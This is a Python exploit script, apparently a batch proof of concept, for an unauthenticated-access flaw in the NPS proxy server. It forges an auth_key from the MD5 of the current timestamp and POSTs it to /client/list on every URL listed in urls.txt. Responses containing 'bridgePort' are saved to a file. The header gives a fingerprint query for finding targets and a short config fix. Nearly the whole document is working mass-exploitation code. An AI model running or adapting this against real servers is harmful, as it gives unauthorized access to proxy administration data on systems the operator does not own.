#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
# author : Lem  
import urllib.request  
import re  
import requests  
import io  
import sys  
import time
import hashlib
requests.packages.urllib3.disable_warnings()  



def title():
    print("""
    Author: Lem
    Condition:body="serializeArray()" && body="/login/verify"
    Name:NPS auth_key 未授权访问漏洞
    Vulnerability details: NPS auth_key 存在未授权访问漏洞，当 nps.conf 中的 auth_key 未配置时攻击者通过生成特定的请求包可以获取服务器后台权限
    Solutions:vim /etc/nps/conf/nps.conf取消注释auth_key,添加auth_crypt_key`注释
    POC:search=&order=asc&offset=0&limit=10&auth_key=8c98b1bdedbc569c4e61eeaeb11ce772&timestamp=1659838908
    EXP: 
    """)

def basic_setting():
    timeout_s=3 
    proxies = {  
    'http': 'http://127.0.0.1:8080',  #proxies=proxies
    'https': 'http://127.0.0.1:8080',  
    }
    requests_methods = {'get': requests.get, 'post': requests.post, 'put': requests.put, 'delete': requests.delete}   
    return timeout_s,proxies,requests_methods

def readfiles(): #批量读取文件，文本格式为https://127.0.0.1:8080
    result = [] 
    with open(r'urls.txt' ,'r') as f:
        for line in f:
         result.append(line.strip().split(',')[0])  
        return result

def poc():  #自定义poc内容
    method= 'post'  # {get,post,put,delete}
    poc_url_path = "/client/list"   
    header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
          #'Accept-Encoding': 'gzip, deflate',
          #'Accept-Language': 'zh-CN,zh;q=0.9',
          #'Cache-Control': 'max-age=0',
          #'Connection': 'keep-alive',
          #'Cookie': 'cookie',
          #'Host': 'www.baidu.com',
          'Content-Type': 'application/x-www-form-urlencoded',
          'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'
          }
    poc_files = ''     #{"file":("test.txt","hello")}  #Content-Disposition: form-data; name="file"; filename="test.txt"
    auth_key,time_now = auth_key_now()
    poc_post_data = f'search=&order=asc&offset=0&limit=10&auth_key={auth_key}&timestamp={time_now}'
    poc_json_data = ''
    verification = 'response'  # {'正则':'regex','响应包':'response','状态码':'status_code'}
    re_data_keyword = 'bridgePort' # 响应包关键词
    regex_match=r'(.+?)' #自定义正则匹配规则 r'r(.+?)l'
    return poc_url_path, poc_post_data,header,poc_files,method,verification,re_data_keyword,regex_match,poc_json_data

def scan_urls_method():
    poc_url_path, poc_post_data,header,poc_files,method,verification,re_data_keyword,regex_match,poc_json_data = poc() 
    result = readfiles()   
    timeout_s,proxies,requests_methods = basic_setting()
    #timeout_s,regex_match,_ ,requests_methods= basic_setting()  #禁用proxies   
    for url in result:  
        scan_url = f"{url}{poc_url_path}"   
        print(scan_url)  
        try:
            if method in requests_methods:
                re_data = requests_methods[method] (scan_url,data=poc_post_data,json=poc_json_data,files=poc_files,timeout=timeout_s,headers=header,verify=False,proxies=proxies) 
            else:
                raise ValueError('Invalid method. Only "get", "post", "pu t" and "delete" are supported.') 
            print(re_data.status_code) 
            #print(re_data.text) 
            if re_data.status_code == 200:
                with open('scan_out.txt', mode='a') as file_handle:
                    process_verification(scan_url, re_data, verification,re_data_keyword,regex_match, file_handle)    
            else:  
                print("不存在")  
                #print(re_data.text)  
        except requests.exceptions.RequestException as e:  
            print("请检查目标列表")  
            #print(re_data.status_code)  
            print(str(e)) 

def process_verification(scan_url, re_data, verification, re_data_keyword,regex_match, file_handle):  
    if verification == 'status_code':  
        print(f"状态码:{re_data.status_code}")  
        file_handle.write(f"{scan_url}\n")  
    elif verification == 'response' and re_data_keyword in re_data.text :  
        print('读取成功') 
        #print(re_data.text) 
        file_handle.write(f"{scan_url}\n{re_data.text}\n")  
    elif verification == 'regex':  
        find_list = re.findall(regex_match, re_data.text)  
        print(find_list)  
        if find_list:  
            file_handle.write(f"{scan_url}-{find_list}\n")  
            #scan_regex_match_url(scan_url,url,find_list)  对匹配的链接内容进行请求  
    else:  
        print('未定义验证方式或验证失败')

def scan_regex_match_url(scan_url,url,find_list):
    scan_path=f"{url}{find_list[0]}" #根据实际情况组合地址路径
    if requests.get(scan_path,timeout=timeout_s,headers=header,verify=False).status_code == 200:
        print('success') 

def auth_key_now():
    now = time.time()
    m = hashlib.md5()
    m.update(str(int(now)).encode("utf8"))
    auth_key = m.hexdigest()
    print(auth_key)
    print(int(now))
    time_now = int(now)
    return auth_key,time_now


if __name__ == '__main__':
    title()   
    scan_urls_method()